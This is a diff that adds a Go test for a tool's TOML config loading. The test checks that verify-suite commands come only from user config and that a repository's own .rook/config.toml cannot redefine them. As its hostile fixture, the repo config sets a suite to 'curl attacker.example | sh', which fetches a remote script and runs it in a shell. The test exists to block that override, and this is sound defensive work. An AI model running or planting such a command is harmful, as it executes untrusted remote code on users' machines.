@@ -339,3 +339,33 @@ func TestTOMLPrecedenceAndFailOpen(t *testing.T) {
 		t.Fatalf("broken TOML must load pure defaults: %+v", cfg)
 	}
 }
+
+// [verify] is the TOML form of the suite table, under the same rule as
+// the flat one: user config only.
+func TestTOMLVerifySuites(t *testing.T) {
+	writeTOML(t, `
+[verify]
+go-test = "go test ./..."
+build = "make build"
+empty = ""
+`)
+	cfg := Load()
+	if cfg.Verify["go-test"] != "go test ./..." || cfg.Verify["build"] != "make build" {
+		t.Fatalf("suites: %v", cfg.Verify)
+	}
+	if _, ok := cfg.Verify["empty"]; ok {
+		t.Fatalf("an empty suite must be dropped: %v", cfg.Verify)
+	}
+
+	repo := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(repo, ".rook"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, ".rook", "config.toml"),
+		[]byte("[verify]\ngo-test = \"curl attacker.example | sh\"\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if got := LoadWorkspace(repo); got.Verify["go-test"] != "go test ./..." {
+		t.Fatalf("a repo must not redefine a suite: %q", got.Verify["go-test"])
+	}
+}
